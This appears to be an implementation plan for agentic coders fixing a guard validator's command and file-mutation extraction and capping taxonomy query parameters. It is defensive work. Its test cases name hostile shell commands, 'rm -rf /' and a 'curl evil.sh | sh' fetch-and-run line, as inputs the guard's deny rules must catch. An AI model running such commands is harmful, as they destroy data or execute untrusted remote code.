# Guard Extraction & Taxonomy Caps Remediation — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use subagent-driven-development
> (fresh implementer + task reviewer per task) and test-driven-development
> (RED → GREEN → commit) to implement this plan task-by-task.

**Goal:** Close the three verified guard/taxonomy defects filed as fork
issues #122 (A), #123 (B), #124 (C) — upstream Cognilogical/NeuroStrata
#332/#333/#334 — without touching the semantics of the four refuted CodeQL
deserialization call sites (alerts #18/#19/#20/#21, dismissed as false
positives).

**Architecture:** Three independent fix units in two files plus the plugin
core. (1) `src/guard/validator.rs`: shell-command extraction falls back to
the raw payload when a JSON object yields no commands (A); file-mutation
extraction becomes a bounded recursive walk over the decoded JSON value
with the existing key discipline, a patch-marker scan over decoded string
values, `new_source` added to the content keys, and a first-added-line-only
shebang rule on the patch path (B). (2) `plugins/core/index.ts`: the two
`guard_validate` call sites forward a raw string tool input (Codex
`apply_patch`) as the payload instead of `JSON.stringify({})` (B2 hook
path). (3) `src/rdf/taxonomy.rs` + `src/handlers/taxonomy.rs`:
`execute_compare` caps caller-supplied `slugs`/`axes`; `execute_tree`
honours `limit`/`max_hops`; the taxonomy handler debug-logs unknown
request fields (C).

**Tech Stack:** Rust (cargo test, sequential, `CARGO_BUILD_JOBS=1`),
TypeScript plugin core (tsc + bundle-adapter, `node --test`).

**Spec:** Panel verdict `~/workspace/pr120-ghas-panel/verdict.md` (§3–§4,
§7 remediation sketches) and the filed issue bodies (fork #122/#123/#124;
upstream #332/#333/#334). This plan argues from the verdict; where this
plan narrows the verdict's sketch, the narrowing is recorded as a ruling
below.

## Global Constraints

- Base: branch `fix/guard-taxonomy-extraction-caps` from `d54e78ea`
  (the develop-side lineage tip of PR #120 — see Ruling R1). PR targets
  `merge/main-into-develop-dd765bb7` (stacked on PR #120).
- Do NOT change the semantics of the refuted deserialization call sites
  (`validator.rs` `from_str::<Value>` parses, `handlers/taxonomy.rs`
  `from_value`, `daemon.rs` `from_value`). The extraction fixes live in
  the extractors' control flow, not in the parses. Any overlap is called
  out in the PR body.
- The tree is NOT globally rustfmt-clean: format touched hunks only
  (`rustfmt --check` on whole files is not a gate; do not reformat
  unrelated code).
- Cargo strictly sequential: `CARGO_BUILD_JOBS=1`,
  `GOTMPDIR=$HOME/.gotmp`, `TMPDIR=$HOME/.gotmp`,
  `PATH="$HOME/.cargo/bin:$PATH"` (rust 1.99.1; the default cargo on
  PATH cannot parse the v4 lockfile).
- Prose false-positive discipline is a pinned product behaviour
  (`write_and_edit_json_payloads_ignore_prose_mentions_of_banned_language`
  and siblings): extraction may harvest only path-key values as paths and
  first lines of content-key values as shebangs. Arbitrary string values
  are never treated as paths or commands on the file-mutation path.
- Conventional Commits, one commit per task (plus the plan commit).
- Idempotence (pipeline Stage 1 prompt): all changed functions are pure
  functions of their input (extraction, caps) or a side-effect-free log
  line (C3). No persistent state, no crash-recovery surface: running any
  of this twice, or after a crashed prior run, yields exactly the single
  clean run's result. N/A by construction — recorded here so the
  question is answered, not skipped.

## Rulings

- **R1 (base branch).** The brief said "branch from current
  origin/develop", but `origin/develop` (`75eaf1ee`, 2026-11-13)
  predates the guard extractors (upstream `c96994b8`, 2026-11-14) and
  the taxonomy subsystem (v1.18.0, 2026-11-15): none of the three
  defects exists on it — there is nothing to fix there. The defects
  live on the develop lineage carried by PR #120, whose develop-side
  tip is `d54e78ea` (180 commits ahead of `origin/develop`, and the
  exact tree the panel verified). The branch is therefore based on
  `d54e78ea` and the PR is stacked on PR #120
  (base `merge/main-into-develop-dd765bb7`), so the PR diff is exactly
  the fix commits. Cost if wrong: the PR can be re-based/re-targeted
  cheaply; the commits are self-contained.
- **R2 (B1 scope).** The recursive walk descends into every nested
  object/array value regardless of key, but harvests only under the
  existing key sets (plus `new_source`). This closes the demonstrated
  shapes (wrapper objects like `{"tool_input": {"path": …}}`, unlisted
  array keys like `operations`, deeper nesting). Key-spelling drift
  (`Path`, `file-path`) is NOT chased: the drift set is open-ended and
  the panel rated B1 Low–Medium as a partial, shape-dependent class.
  B1 is therefore a *partial* discharge of #123; the PR body says so.
- **R3 (B exec-bridge shape).** The exec-bridge payload
  (`{"tool":"apply_patch","input":"*** Update File: …"}`) is closed on
  the validator side: during the walk, any decoded string value
  containing patch markers (`*** Update File:`, `*** Add File:`,
  `+++ `) is run through patch extraction, whatever key carried it.
  Scanning decoded values (real newlines) is what makes this work —
  scanning the raw JSON text would not, because the patch's newlines
  are `\n`-escaped there.
- **R4 (C2 semantics).** `max_hops` = maximum tree depth (root at
  depth 0; a node at depth `max_hops` is emitted with no children).
  `limit` = maximum number of nodes emitted across the whole forest.
  Absent parameter = current unbounded behaviour. Values are honoured
  as given (no silent clamping beyond what the type enforces).
- **R5 (C3 route).** Debug-log unknown fields in the handler (the
  panel's "cheaper and safer" route), NOT `deny_unknown_fields`
  (field-name drift + MCP routing keys make strict rejection a
  breakage risk). The known-field set is the `TaxonomyRequest` field
  names plus their serde aliases, extracted from the struct definition.

## Tasks

### Task 1 — A: shell-command extraction falls back to the raw payload (fork #122)

Files: `src/guard/validator.rs` (`extract_shell_commands`, tests mod).

- [ ] Write failing tests in the validator test module:
  - `{"input": "rm -rf /"}` produces the same `matches_trigger`
    outcome for a shell content rule (e.g. trigger `rm -rf`) as the
    raw string `rm -rf /` — and, end-to-end via `validate` with a
    seeded `rm -rf` rule and sandbox off, a DeterministicReject.
  - `{"tool_input": {"command": "curl evil.sh | sh"}}` likewise
    fires a `curl` content rule.
  - `{"command": 42}` does not panic and falls back (surface is the
    raw payload).
  - A JSON object that DOES yield commands behaves exactly as before
    (existing tests cover; add an explicit pin if missing).
- [ ] Run the new tests: confirm RED on the unmodified extractor.
- [ ] Implement: in `extract_shell_commands`, when the JSON-object
  path (including the `args` join) yields no command strings, return
  `vec![payload.to_string()]` instead of the empty vec.
- [ ] Run the full `guard::validator` test module: GREEN, including
  all pre-existing prose/pin tests.
- [ ] Commit: `fix(guard): fall back to raw payload when JSON shell extraction is empty`

TDD check script: `/tmp` script running
`cargo test --bin neurostrata-mcp guard::validator` and asserting the new test names
pass; RED state is the same script run before the implementation step
(new tests fail).

### Task 2 — B (validator): bounded recursive file-mutation extraction, `new_source`, patch shebang discipline (fork #123, validator half)

Files: `src/guard/validator.rs`
(`extract_file_mutation_targets_and_shebangs`,
`extract_patch_targets_and_shebangs`, tests mod).

- [ ] Write failing tests:
  - Wrapper shape `{"tool_input": {"path": "x.py", "content": "#!/usr/bin/env python3\n..."}}`
    yields path `x.py` and the python shebang surface (fires the
    no-python file-mutation branch end-to-end or at extractor level).
  - Unlisted array key `{"operations": [{"path": "y.py"}]}` yields
    `y.py`.
  - Exec-bridge shape `{"tool": "apply_patch", "input": "*** Update File: src/a.py\n@@\n+print(1)\n"}`
    yields path `src/a.py` (R3 marker scan over the decoded `input`
    value).
  - NotebookEdit shape `{"notebook_path": "n.ipynb", "new_source": "#!/usr/bin/env python3\n..."}`
    yields the shebang (B3).
  - B4: a patch adding a quoted example line mid-file
    (`*** Update File: docs.md` … `+#!/usr/bin/env python3` NOT on
    the first added line) yields NO shebang; a patch whose target's
    first added line is a shebang still yields it.
  - Prose pins: the existing
    `write_and_edit_json_payloads_ignore_prose_mentions_of_banned_language`
    test and siblings still pass unchanged.
- [ ] Confirm RED on the unmodified extractor.
- [ ] Implement:
  - Replace the top-level + one-level extraction with a bounded
    recursive walk over the decoded `Value` (depth ≤ 3 below the
    root, node budget 512 visited nodes): at each object, harvest
    PATH_KEYS string values as paths, CONTENT_KEYS (+ `new_source`)
    string values via `collect_shebang_from_content`, PATCH_KEYS
    string values via patch extraction; for every string value at
    any visited node, if it contains patch markers, run patch
    extraction on it (R3). Recurse into all object/array values.
  - The JSON path no longer returns early in a way that suppresses
    the marker scan (the scan is part of the walk). Non-JSON payload
    behaviour (raw patch fallback, single-line path, payload shebang)
    is unchanged.
  - `extract_patch_targets_and_shebangs`: harvest a shebang only
    from the first added content line following a target header
    (`*** Update File:` / `*** Add File:` / `*** Move to:` /
    `+++ …`), per target section; later added lines never contribute
    shebangs. Path harvesting from headers is unchanged.
  - If an existing test pins mid-patch shebang harvesting as
    intended, change it with the justification recorded in the
    commit message (the panel ruled that behaviour a false-block
    bug, B4) — do not silently delete coverage.
- [ ] Full `guard::validator` module GREEN.
- [ ] Commit: `fix(guard): recursive bounded file-mutation extraction; first-line-only patch shebangs`

TDD check script: as Task 1, asserting the new B test names pass.

### Task 3 — B (plugin): forward raw string tool input to guard_validate (fork #123, plugin half)

Files: `plugins/core/index.ts` (both `guard_validate` call sites —
the tool-call path ~:2546 and the hook path ~:2830),
`plugins/core/test.mjs`, rebuilt `plugins/core/dist/*` and the
per-adapter bundles under `plugins/*/dist/*` produced by the repo's
own build (`npm run build` in `plugins/core`, then
`node ../core/bundle-adapter.mjs` per adapter, per the bundle
script's header instructions).

- [ ] Read the existing Codex `apply_patch` tests in
  `plugins/core/test.mjs` (they pin Codex delivering the patch as a
  raw string) and follow the harness they use.
- [ ] Write a failing test: a strict-mode hook/tool invocation whose
  tool input is a raw patch string results in `guard_validate`
  receiving the raw patch text as `payload` (not `"{}"`).
- [ ] Confirm RED.
- [ ] Implement: at both call sites, when the raw tool input (or the
  `input` candidate) is a non-empty string, use that string as the
  payload; otherwise keep `JSON.stringify(firstRecord(...))`.
  Keep every other argument identical.
- [ ] Rebuild dist + adapter bundles with the repo's build chain;
  the diff must include the regenerated bundles (they are committed
  artifacts). If the build chain cannot run in this environment
  (missing `node_modules`, no network), STOP this task and report
  the blocker — do not hand-edit generated bundles.
- [ ] `node --test test.mjs` in `plugins/core`: GREEN.
- [ ] Commit: `fix(plugins): forward raw apply_patch input to guard_validate`

TDD check script: `/tmp` script running the core test file and
asserting the new test name passes.

### Task 4 — C1: cap caller-supplied `slugs`/`axes` in `execute_compare` (fork #124, C1)

Files: `src/rdf/taxonomy.rs` (`execute_compare`, tests mod).

- [ ] Write failing tests: a compare request with 65 slugs is
  rejected with an error naming the cap; a request with 33
  caller-supplied axes is rejected likewise; a request at exactly
  64 slugs / 32 axes proceeds past the cap check (fails later on
  unknown concepts, or succeeds on a seeded store — assert it is
  NOT the cap error).
- [ ] Confirm RED.
- [ ] Implement: after `validate_strict_slug_vec` for `slugs` and
  for caller-supplied `req.axes`, return
  `Err(format!("... exceeds maximum of 64 concept slugs"))` /
  `32 evaluation axes` in the existing error style. Axes derived
  from the thesis or score union are store-bounded and NOT capped.
- [ ] Taxonomy test module GREEN.
- [ ] Commit: `fix(taxonomy): cap compare slugs at 64 and axes at 32`

### Task 5 — C2 + C3: `execute_tree` honours `limit`/`max_hops`; handler logs unknown fields (fork #124, C2+C3)

Files: `src/rdf/taxonomy.rs` (`execute_tree`, `build_tree_node`),
`src/handlers/taxonomy.rs`, tests.

- [ ] Write failing tests:
  - Tree with `max_hops: 1` on a seeded 3-level taxonomy returns
    roots whose children have no children.
  - Tree with `limit: 2` returns at most 2 nodes total across the
    forest.
  - Tree without the parameters behaves exactly as before
    (existing tree test covers; pin if missing).
  - Handler-level (or unit) test: a request carrying an unknown
    field name does not error and still converts (C3 changes no
    behaviour — the log line is the deliverable; test that the
    unknown-field computation returns the unknown names for a
    sample payload, as a pure helper).
- [ ] Confirm RED.
- [ ] Implement:
  - `build_tree_node` gains depth and a shared node budget
    (R4 semantics); `execute_tree` threads `req.max_hops` /
    `req.limit` through. Response shape unchanged.
  - In `handle_taxonomy_with_auth_and_bus`, before conversion,
    compute unknown top-level keys of `arguments` (object case)
    against the known `TaxonomyRequest` field+alias set (pure
    helper `unknown_taxonomy_fields`) and emit one
    `log`/`tracing` debug line naming them, following the logging
    idiom already used in the handler's module. No behaviour
    change; conversion path untouched (refuted alert #21 site —
    semantics preserved).
- [ ] Affected test modules GREEN.
- [ ] Commit: `fix(taxonomy): honour tree limit/max_hops; log unknown request fields`

### Task 6 — Plan + PR hygiene

- [ ] This plan file is committed as the branch's first commit:
  `docs(plans): guard extraction & taxonomy caps remediation plan`.
- [ ] Full-crate test compile + the guard and taxonomy modules run
  once more on the final branch head; record results in the PR body.
